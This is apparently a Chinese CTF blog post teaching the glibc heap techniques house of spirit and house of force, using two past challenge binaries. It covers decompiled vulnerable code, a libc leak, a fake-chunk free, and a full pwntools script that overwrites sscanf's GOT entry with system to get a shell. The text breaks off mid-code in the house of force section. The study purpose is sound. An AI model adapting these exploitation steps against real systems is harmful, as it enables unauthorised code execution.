<!DOCTYPE html>
<html >
<head>

    <!-- hexo-inject:begin --><!-- hexo-inject:end --><!--[if lt IE 9]>
        <style>body {display: none; background: none !important} </style>
        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
    <![endif]-->

<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
<meta name="format-detection" content="telephone=no" />
<meta name="author" content="Hcamael" />



<meta name="description" content="准备些一份house of系列的学习博文，在how2heap上包括下面这些：  house of spirit house_of_force house_of_einherjar house_of_orange house_of_lore">
<meta name="keywords" content="bin">
<meta property="og:type" content="article">
<meta property="og:title" content="Pwn学习之house of系列(一)">
<meta property="og:url" content="http://0x48.pw/2018/01/16/0x41/index.html">
<meta property="og:site_name" content="Hc1m1">
<meta property="og:description" content="准备些一份house of系列的学习博文，在how2heap上包括下面这些：  house of spirit house_of_force house_of_einherjar house_of_orange house_of_lore">
<meta property="og:updated_time" content="2018-01-30T09:58:50.953Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Pwn学习之house of系列(一)">
<meta name="twitter:description" content="准备些一份house of系列的学习博文，在how2heap上包括下面这些：  house of spirit house_of_force house_of_einherjar house_of_orange house_of_lore">

<link rel="apple-touch-icon" href= "/apple-touch-icon.png">


    <link rel="alternate" href="/rss.xml" title="Hc1m1" type="application/atom+xml">



    <link rel="shortcut icon" href="/img/favicon.png">



    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">



    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">



    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">


<link rel="stylesheet" href="/css/style.css">



<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">


<title>Pwn学习之house of系列(一) | Hc1m1</title>

<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>

<script>
    var yiliaConfig = {
        fancybox: true,
        animate: true,
        isHome: false,
        isPost: true,
        isArchive: false,
        isTag: false,
        isCategory: false,
        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
        search: undefined
    }
</script>


    <script>
        yiliaConfig.jquery_ui = [true, "//cdn.bootcss.com/jqueryui/1.10.4/jquery-ui.min.js", "//cdn.bootcss.com/jqueryui/1.10.4/css/jquery-ui.min.css"];
    </script>



    <script> yiliaConfig.rootUrl = "\/";</script>





    <script>
        var _hmt = _hmt || [];
        (function() {
            var hm = document.createElement("script");
            hm.src = "//hm.baidu.com/hm.js?4b6b8b9a09d24f4d4e26c50bd1707fd7";
            var s = document.getElementsByTagName("script")[0]; 
            s.parentNode.insertBefore(hm, s);
        })();
    </script><!-- hexo-inject:begin --><!-- hexo-inject:end -->


</head>
<body>
  <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id="container">
    <div class="left-col">
    <div class="overlay"></div>
<div class="intrude-less">
    <header id="header" class="inner">
        <a href="/" class="profilepic">
            <img src="/img/author.png" class="animated zoomIn">
        </a>
        <hgroup>
          <h1 class="header-author"><a href="/">Hcamael</a></h1>
        </hgroup>

        
        <p class="header-subtitle">Blog</p>
        

        


        
            <div id="switch-btn" class="switch-btn">
                <div class="icon">
                    <div class="icon-ctn">
                        <div class="icon-wrap icon-house" data-idx="0">
                            <div class="birdhouse"></div>
                            <div class="birdhouse_holes"></div>
                        </div>
                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
                            <div class="ribbon"></div>
                        </div>
                        
                        <div class="icon-wrap icon-link hide" data-idx="2">
                            <div class="loopback_l"></div>
                            <div class="loopback_r"></div>
                        </div>
                        
                        
                        <div class="icon-wrap icon-me hide" data-idx="3">
                            <div class="user"></div>
                            <div class="shoulder"></div>
                        </div>
                        
                    </div>
                    
                </div>
                <div class="tips-box hide">
                    <div class="tips-arrow"></div>
                    <ul class="tips-inner">
                        <li>菜单</li>
                        <li>标签</li>
                        
                        <li>友情链接</li>
                        
                        
                        <li>关于我</li>
                        
                    </ul>
                </div>
            </div>
        

        <div id="switch-area" class="switch-area">
            <div class="switch-wrap">
                <section class="switch-part switch-part1">
                    <nav class="header-menu">
                        <ul>
                        
                            <li><a href="/">主页</a></li>
                        
                            <li><a href="/archives/">所有文章</a></li>
                        
                            <li><a href="/tags/">标签云</a></li>
                        
                            <li><a href="/about/">关于我</a></li>
                        
                        </ul>
                    </nav>
                    <nav class="header-nav">
                        <ul class="social">
                            
                                <a class="fa Email" href="mailto: baiyjrh@gmail.com" title="Email"></a>
                            
                                <a class="fa GitHub" href="https://github.com/Hcamael" title="GitHub"></a>
                            
                                <a class="fa RSS" href="/rss.xml" title="RSS"></a>
                            
                        </ul>
                    </nav>
                </section>
                
                
                <section class="switch-part switch-part2">
                    <div class="widget tagcloud" id="js-tagcloud">
                        <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Crypto/">Crypto</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/GIT/">GIT</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Linux/">Linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Pentest/">Pentest</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Python/">Python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/RE/">RE</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SQLi/">SQLi</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web/">Web</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/bin/">bin</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/network/">network</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/old-blog/">old_blog</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php/">php</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/research/">research</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sb/">sb</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/share/">share</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/随笔/">随笔</a></li></ul>
                    </div>
                </section>
                
                
                
                <section class="switch-part switch-part3">
                    <div id="js-friends">
                    
                      <a class="main-nav-link switch-friends-link" href="http://vidar.club">Vidar-Team</a>
                    
                      <a class="main-nav-link switch-friends-link" href="https://wiki.vidar.club/doku.php">wiki</a>
                    
                      <a class="main-nav-link switch-friends-link" href="https://drops.vidar.club/">Drops</a>
                    
                      <a class="main-nav-link switch-friends-link" href="http://lightless.me">lightless</a>
                    
                      <a class="main-nav-link switch-friends-link" href="http://homeway.me">夏日小草</a>
                    
                      <a class="main-nav-link switch-friends-link" href="http://www.edwardl.xyz">Edward_L</a>
                    
                      <a class="main-nav-link switch-friends-link" href="http://aklis.info">Aklis</a>
                    
                      <a class="main-nav-link switch-friends-link" href="http://libc.pw">Explorer</a>
                    
                      <a class="main-nav-link switch-friends-link" href="http://lorexxar.cn">Lorexxar</a>
                    
                      <a class="main-nav-link switch-friends-link" href="http://misty.moe/">Misty</a>
                    
                      <a class="main-nav-link switch-friends-link" href="http://www.venenof.com/">Veneno</a>
                    
                      <a class="main-nav-link switch-friends-link" href="http://www.wupco.cn">Wupco</a>
                    
                      <a class="main-nav-link switch-friends-link" href="http://www.scanfsec.com">scanf</a>
                    
                      <a class="main-nav-link switch-friends-link" href="http://repwn.com">Bird</a>
                    
                      <a class="main-nav-link switch-friends-link" href="http://pzhxbz.cn">pzhxbz</a>
                    
                      <a class="main-nav-link switch-friends-link" href="http://veritas501.space/">veritas</a>
                    
                    </div>
                </section>
                

                
                
                <section class="switch-part switch-part4">
                
                    <div id="js-aboutme">HDUISA, web狗, 菜鸡H, 正在向bin爷爷努力前进</div>
                </section>
                
            </div>
        </div>
    </header>                
</div>
    </div>
    <div class="mid-col">
      <nav id="mobile-nav">
      <div class="overlay">
          <div class="slider-trigger"></div>
          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">Hcamael</a></h1>
      </div>
    <div class="intrude-less">
        <header id="header" class="inner">
            <a href="/" class="profilepic">
                <img src="/img/author.png" class="animated zoomIn">
            </a>
            <hgroup>
              <h1 class="header-author"><a href="/" title="回到主页">Hcamael</a></h1>
            </hgroup>
            
            <p class="header-subtitle">Blog</p>
            
            <nav class="header-menu">
                <ul>
                
                    <li><a href="/">主页</a></li>
                
                    <li><a href="/archives/">所有文章</a></li>
                
                    <li><a href="/tags/">标签云</a></li>
                
                    <li><a href="/about/">关于我</a></li>
                
                <div class="clearfix"></div>
                </ul>
            </nav>
            <nav class="header-nav">
                        <ul class="social">
                            
                                <a class="fa Email" target="_blank" href="mailto: baiyjrh@gmail.com" title="Email"></a>
                            
                                <a class="fa GitHub" target="_blank" href="https://github.com/Hcamael" title="GitHub"></a>
                            
                                <a class="fa RSS" target="_blank" href="/rss.xml" title="RSS"></a>
                            
                        </ul>
            </nav>
        </header>                
    </div>
    <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
</nav>
      <div class="body-wrap"><article id="post-0x41" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2018/01/16/0x41/" class="article-date">
      <time datetime="2018-01-16T02:25:07.000Z" itemprop="datePublished">2018-01-16</time>
</a>


    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      Pwn学习之house of系列(一)
    </h1>
  

      </header>
      
      <div class="article-info article-info-post">
        

        
    <div class="article-tag tagcloud">
        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/bin/">bin</a></li></ul>
    </div>

        <div class="clearfix"></div>
      </div>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <p>准备些一份house of系列的学习博文，在how2heap上包括下面这些：</p>
<ul>
<li>house of spirit</li>
<li>house_of_force</li>
<li>house_of_einherjar</li>
<li>house_of_orange</li>
<li>house_of_lore</li>
</ul>
<a id="more"></a>
<h1 id="house-of-spirit"><a href="#house-of-spirit" class="headerlink" title="house of spirit"></a>house of spirit</h1><p>house of spirit是fastbin的一种利用方法，利用demo可参考: <a href="https://github.com/shellphish/how2heap/blob/master/house_of_spirit.c" target="_blank" rel="external">https://github.com/shellphish/how2heap/blob/master/house_of_spirit.c</a></p>
<p>我通过具体的CTF Pwn题目来学习该利用方法，题目见: <a href="https://github.com/ctfs/write-ups-2014/tree/master/hack-lu-ctf-2014/oreo" target="_blank" rel="external">https://github.com/ctfs/write-ups-2014/tree/master/hack-lu-ctf-2014/oreo</a></p>
<p>这题是hack.lu 2014 ctf的一道400分的32位下的Pwn题，这题原本是没有给libc的，但是我搜了下网上这题的writeup，不需要libc有两种方法，一种是假设服务器上用的是最新版的libc，然后从各个发行版的系统找libc，一个一个试，另一种是使用ret2dl-resolve，这个利用方法我准备单独写一篇博文来说，而本文主要是学习house of spirit，所以就用本地的libc，假设已知libc。</p>
<p>漏洞点很简单，首先要能看出一个结构体：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">struct rifle &#123;</div><div class="line">    char descript[0x19]</div><div class="line">    char name[0x1b]</div><div class="line">    char *pre_add</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>然后在<code>sub_8048644</code>函数中，大致逻辑如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">add()</div><div class="line">&#123;</div><div class="line">  rifles *v1;</div><div class="line">  unsigned int v2;</div><div class="line"></div><div class="line">  v1 = rifle;</div><div class="line">  rifle = (rifles *)malloc(0x38u);</div><div class="line">  if ( rifle )</div><div class="line">  &#123;</div><div class="line">    rifle-&gt;pre_add = (int)v1;</div><div class="line">    printf(&quot;Rifle name: &quot;);</div><div class="line">    fgets(rifle-&gt;name, 56, stdin);</div><div class="line">    str_deal(rifle-&gt;name);</div><div class="line">    printf(&quot;Rifle description: &quot;);</div><div class="line">    fgets(rifle-&gt;descript, 56, stdin);</div><div class="line">    str_deal(rifle-&gt;descript);</div><div class="line">    ++rifle_num;</div><div class="line">  &#125;</div><div class="line">  else</div><div class="line">  &#123;</div><div class="line">    puts(&quot;Something terrible happened!&quot;);</div><div class="line">  &#125;</div></pre></td></tr></table></figure>
<p>结构体中<code>name</code>的长度只有0x1b，但是却能输入56长度的字符串，所以可以把后面的<code>pre_add</code>覆盖，或者把下一个堆进行覆盖</p>
<h2 id="泄露内存"><a href="#泄露内存" class="headerlink" title="泄露内存"></a>泄露内存</h2><p>因为libc已知，程序没开PIE，所以只需要泄露libc地址，然后算出libc基地址</p>
<p>内存泄露利用的是<code>sub_8048729</code>函数，该函数的大致逻辑如下:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">show_rifles()</div><div class="line">&#123;</div><div class="line">  rifles *i;</div><div class="line">  unsigned int v2;</div><div class="line"></div><div class="line">  printf(&quot;Rifle to be ordered:\n%s\n&quot;, &quot;===================================&quot;);</div><div class="line">  for ( i = rifle; i; i = (rifles *)i-&gt;pre_add )</div><div class="line">  &#123;</div><div class="line">    printf(&quot;Name: %s\n&quot;, i-&gt;name);</div><div class="line">    printf(&quot;Description: %s\n&quot;, i);</div><div class="line">    puts(&quot;===================================&quot;);</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><code>rifle-&gt;pre_add</code>是可控的，把<code>rifle-&gt;pre_add = 0x804A258-25</code>设置为sscanf的got表地址减去25，这样Name输出的就是<code>sscanf_got</code>的值，并且<code>sscanf_got-&gt;pre_add</code>的值为0，能让该程序继续运行而不报错</p>
<p>得到<code>sscanf_got</code>的值后，可以通过libc的偏移算出libc的基地址</p>
<h2 id="使用house-of-spirit进行任意地址写"><a href="#使用house-of-spirit进行任意地址写" class="headerlink" title="使用house_of_spirit进行任意地址写"></a>使用house_of_spirit进行任意地址写</h2><p>house of spirit简单的来说就是free一个假的fastbin堆块，然后再下次malloc的时候就会返回该假堆块</p>
<p>所以第一步是要构造假的堆块，在该程序中，只有一个<code>malloc(0x38)</code>，所以要构造一个<code>size=0x41</code>的堆块，在<code>.bss_804A2A0</code>地址的<code>order_num</code>，和<code>.bss_804A2A4</code>的<code>rifle_num</code>，一个是在free的时候自增1，一个是在rifle add的时候自增1，所以只要add 0x41次rifle，就能把rifle_num设置为0x41</p>
<p>chunk的size位伪造好了，现在是bypass libc对free fastbin的check，主要是会对下一个chunk的size进行check，所以不仅要伪造当前check的size，还要伪造下一个chunk的size</p>
<p>下一个chunk的地址是<code>0x804A2A4+0x40=0x804a2e4</code>，该地址是储存<code>notice</code>的地址，属于可控区域，代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">information = (char *)&amp;unk_804A2C0;</div><div class="line"></div><div class="line">leave()</div><div class="line">&#123;</div><div class="line">  unsigned int v0;</div><div class="line"></div><div class="line">  printf(&quot;Enter any notice you&apos;d like to submit with your order: &quot;);</div><div class="line">  fgets(information, 128, stdin);</div><div class="line">  str_deal(information);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>假堆块构造完成了，free了之后<code>0x804A2A0</code>将会加入到fastbin中，在下一次add rifle的时候malloc会返回该地址，所以<code>0x804A2A4</code>往下的变量都可控，这个时候我们能修改<code>information</code>的值，然后在<code>leave</code>函数会向<code>information</code>指向的地址写入值</p>
<p>这样就达到了任意地址写的目的</p>
<h2 id="最终利用"><a href="#最终利用" class="headerlink" title="最终利用"></a>最终利用</h2><p>能做到任意地址写，下面就很简单了，方法有很多，我使用的是重写<code>sscanf_got</code>地址的值为计算出的<code>system</code>地址</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">int read_action()</div><div class="line">&#123;</div><div class="line">  int v1; </div><div class="line">  char s;</div><div class="line">  unsigned int v3;</div><div class="line"></div><div class="line">  do</div><div class="line">  &#123;</div><div class="line">    printf(&quot;Action: &quot;);</div><div class="line">    fgets(&amp;s, 32, stdin);</div><div class="line">  &#125;</div><div class="line">  while ( !__isoc99_sscanf(&amp;s, &quot;%u&quot;, &amp;v1) );</div><div class="line">  return v1;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>当输入了<code>/bin/sh</code>之后，会赋值给变量<code>s</code>，然后传给<code>sscanf</code>，这时候<code>sscanf_got</code>的值已经被改成了system的值，所以实际执行的是<code>system(&quot;/bin/sh&quot;)</code></p>
<p>最终达成getshell的目的，payload如下:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/env python</div><div class="line"># -*- coding=utf-8 -*-</div><div class="line"></div><div class="line">from pwn import *</div><div class="line"></div><div class="line">context.log_level = &quot;debug&quot;</div><div class="line"></div><div class="line">def add(name, descrip):</div><div class="line">    p.readuntil(&quot;Action:&quot;)</div><div class="line">    p.sendline(&quot;1&quot;)</div><div class="line">    p.readuntil(&quot;name:&quot;)</div><div class="line">    p.sendline(name)</div><div class="line">    p.readuntil(&quot;description:&quot;)</div><div class="line">    p.sendline(descrip)</div><div class="line"></div><div class="line">def show_rifles():</div><div class="line">    p.readuntil(&quot;Action:&quot;)</div><div class="line">    p.sendline(&quot;2&quot;)</div><div class="line">    p.readuntil(&quot;Name: &quot;)</div><div class="line">    p.readuntil(&quot;Name: &quot;)</div><div class="line">    return u32(p.read(4))</div><div class="line"></div><div class="line">def free():</div><div class="line">    p.readuntil(&quot;Action:&quot;)</div><div class="line">    p.sendline(&quot;3&quot;)</div><div class="line"></div><div class="line">def leave(message):</div><div class="line">    p.readuntil(&quot;Action:&quot;)</div><div class="line">    p.sendline(&quot;4&quot;)</div><div class="line">    p.readuntil(&quot;order: &quot;)</div><div class="line">    p.sendline(message)</div><div class="line"></div><div class="line"></div><div class="line">sscanf_got = 0x804A258</div><div class="line">fake_heap = 0x804A2A0</div><div class="line">system_offset = 0x3ada0</div><div class="line"></div><div class="line">p = process(&quot;oreo_35f118d90a7790bbd1eb6d4549993ef0&quot;, stdin=PTY)</div><div class="line"></div><div class="line">name_payload1 = &quot;aaa&quot; + &quot;bbbb&quot;*6 + p32(sscanf_got-25)</div><div class="line">add(name_payload1, &quot;hhh&quot;)</div><div class="line">sscanf = show_rifles()</div><div class="line">libc_base = sscanf - 0x5c4c0</div><div class="line">for x in xrange(0x40-1):</div><div class="line">    add(&quot;mm&quot;, &quot;gg&quot;)</div><div class="line"></div><div class="line">name_payload2 = &quot;aaa&quot; + &quot;bbbb&quot;*6 + p32(fake_heap+8)</div><div class="line">add(name_payload2, &quot;uuu&quot;)</div><div class="line">message_payload = &quot;\x00\x00\x00\x00&quot;*9 + p32(0x41)</div><div class="line">leave(message_payload)</div><div class="line"># raw_input()</div><div class="line"></div><div class="line">free()</div><div class="line"># raw_input()</div><div class="line">add(&quot;name&quot;, p32(sscanf_got))</div><div class="line">leave(p32(libc_base+system_offset))</div><div class="line">p.sendline(&quot;/bin/sh\0&quot;)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
<h1 id="house-of-force"><a href="#house-of-force" class="headerlink" title="house of force"></a>house of force</h1><p>house of force是修改top chunk size的一种利用方法，利用demo可参考: <a href="https://github.com/shellphish/how2heap/blob/master/house_of_force.c" target="_blank" rel="external">https://github.com/shellphish/how2heap/blob/master/house_of_force.c</a></p>
<p>题目见: <a href="https://github.com/ctfs/write-ups-2016/tree/master/bctf-2016/exploit/bcloud-200" target="_blank" rel="external">https://github.com/ctfs/write-ups-2016/tree/master/bctf-2016/exploit/bcloud-200</a></p>
<p>该利用姿势是由于libc的堆管理在malloc的时候默认top chunk的size是正确合法的，所以不会去检查top chunk的size值，这就导致了一种情况，当一个程序存在可以修改top chunk size的漏洞时，我们把top chunk的size修改成0xffffffff(x86)</p>
<p>假设这个时候的top_chunk=0x601200, 然后malloc(0xffe00020)，然后对malloc申请的size进行检查，<code>0xffe00030 &lt; top_chunk_size</code>，所以可以成功malloc内存，然后计算top_chunk的新地址：<code>0xffe00030+0x601200=0x100401230</code>, 因为是x86环境，最高位溢出了，所以<code>top_chunk=0x401230</code></p>
<p>然后下次我们再malloc的时候，返回的地址就是<code>0x401238</code></p>
<p>下面，我们再通过2016年bctf的一道题目来加强对该利用方式的理解</p>
<h2 id="泄露堆地址"><a href="#泄露堆地址" class="headerlink" title="泄露堆地址"></a>泄露堆地址</h2><p>有一个read_buffer函数:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">int read_buffer(int input, int len, char a3)</div><div class="line">&#123;</div><div class="line">  char buf;</div><div class="line">  int i;</div><div class="line"></div><div class="line">  for ( i = 0; i &lt; len; ++i )</div><div class="line">  &#123;</div><div class="line">    if ( read(0, &amp;buf, 1u) &lt;= 0 )</div><div class="line">      exit(-1);</div><div class="line">    if ( buf == a3 )</div><div class="line">      break;</div><div class="line">    *(_BYTE *)(input + i) = buf;</div><div class="line">  &#125;</div><div class="line">  *(_BYTE *)(i + input) = 0;         // off by one</div><div class="line">  return i;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>在注释里也已经标出来了，该函数存在off_by_one漏洞，会溢出一个<code>\x00</code></p>
<p>然后存在内存泄露的是需要输入username的函数：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">void welcom_user()</div><div class="line">&#123;</div><div class="line">  char s; // [esp+1Ch] [ebp-5Ch]</div><div class="line">  char *v2; // [esp+5Ch] [ebp-1Ch]</div><div class="line">  unsigned int v3; // [esp+6Ch] [ebp-Ch]</div><div class="line"></div><div class="line">  memset(&amp;s, 0, 0x50u);</div><div class="line">  puts(&quot;Input your name:&quot;);</div><div class="line">  read_buffer((int)&amp;s, 0x40, &apos;\n&apos;);</div><div class="line">  v2 = (char *)malloc(0x40u);</div><div class="line">  name = (int)v2;</div><div class="line">  strcpy(v2, &amp;s);</div><div class="line">  welcom((int)v2);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>看上面的注释，计算出v2变量和s变量在栈中的距离为0x40</p>
<p>当我输入0x40的a时，会把变量s填充满，然后在v1的第一个字节添加字符串结尾<code>\x00</code>，接下来，malloc的返回值赋给v2，把<code>\x00</code>给覆盖掉了，所以在strcpy函数把s的值+v2的值copy到v2指向的堆中，然后在welcom函数中输出，这样获得到了堆的地址</p>
<h2 id="修改top-chunk-size"><a href="#修改top-chunk-size" class="headerlink" title="修改top_chunk size"></a>修改top_chunk size</h2><p>之后，有一个输入org和host的函数：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">void sub_804884E()</div><div class="line">&#123;</div><div class="line">  char org; // [esp+1Ch] [ebp-9Ch]</div><div class="line">  char *v1; // [esp+5Ch] [ebp-5Ch]</div><div class="line">  int host; // [esp+60h] [ebp-58h]</div><div class="line">  char *v3; // [esp+A4h] [ebp-14h]</div><div class="line">  unsigned int v4; // [esp+ACh] [ebp-Ch]</div><div class="line"></div><div class="line">  memset(&amp;org, 0, 0x90u);</div><div class="line">  puts(&quot;Org:&quot;);</div><div class="line">  read_buffer((int)&amp;org, 0x40, 10);</div><div class="line">  puts(&quot;Host:&quot;);</div><div class="line">  read_buffer((int)&amp;host, 0x40, 10);</div><div class="line">  v3 = (char *)malloc(0x40u);</div><div class="line">  v1 = (char *)malloc(0x40u);</div><div class="line">  org_static = (int)v1;</div><div class="line">  host_static = (int)v3;</div><div class="line">  strcpy(v3, (const char *)&amp;host);</div><div class="line">  strcpy(v1, &amp;org);</div><div class="line">  puts(&quot;OKay! Enjoy:)&quot;);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>该函数存在和上面user函数一样的问题，我们来看看栈布局：</p>
<table>
<thead>
<tr>
<th style="text-align:center">org size=0x40</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">v1 size=0x4</td>
</tr>
<tr>
<td style="text-align:center">host size=0x40</td>
</tr>
<tr>
<td style="text-align:center">v3 size=0x4</td>
</tr>
</tbody>
</table>
<p>然后再来看看malloc两次后的堆布局：</p>
<table>
<thead>
<tr>
<th style="text-align:center">user size=0x49</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">v3 size=0x49</td>
</tr>
<tr>
<td style="text-align:center">v1 size=0x49</td>
</tr>
<tr>
<td style="text-align:center">top_chunk size=???</td>
</tr>
</tbody>
</table>
<p>v1储存的是org的值，如果org中没有<code>\x00</code>，v1中没有<code>\x00</code>，strcpy将会copy org+v1+host的值到堆中去，而堆中v1的size只有0x48，所以会导致堆溢出，可以覆盖到top_chunk的size，我们将该size赋值为0xffffffff</p>
<h2 id="控制malloc的返回值"><a href="#控制malloc的返回值" class="headerlink" title="控制malloc的返回值"></a>控制malloc的返回值</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">int new()</div><div class="line">&#123;</div><div class="line">  int result; // eax</div><div class="line">  signed int i; // [esp+18h] [ebp-10h]</div><div class="line">  int v2; // [esp+1Ch] [ebp-Ch]</div><div class="line"></div><div class="line">  for ( i = 0; i &lt;= 9 &amp;&amp; note_list[i]; ++i )</div><div class="line">    ;</div><div class="line">  if ( i == 10 )</div><div class="line">    return puts(&quot;Lack of space. Upgrade your account with just $100 :)&quot;);</div><div class="line">  puts(&quot;Input the length of the note content:&quot;);</div><div class="line">  v2 = get_int();</div><div class="line">  note_list[i] = (int)malloc(v2 + 4);</div><div class="line">  if ( !note_list[i] )</div><div class="line">    exit(-1);</div><div class="line">  note_length[i] = v2;</div><div class="line">  puts(&quot;Input the content:&quot;);</div><div class="line">  read_buffer(note_list[i], v2, 10);</div><div class="line">  printf(&quot;Create success, the id is 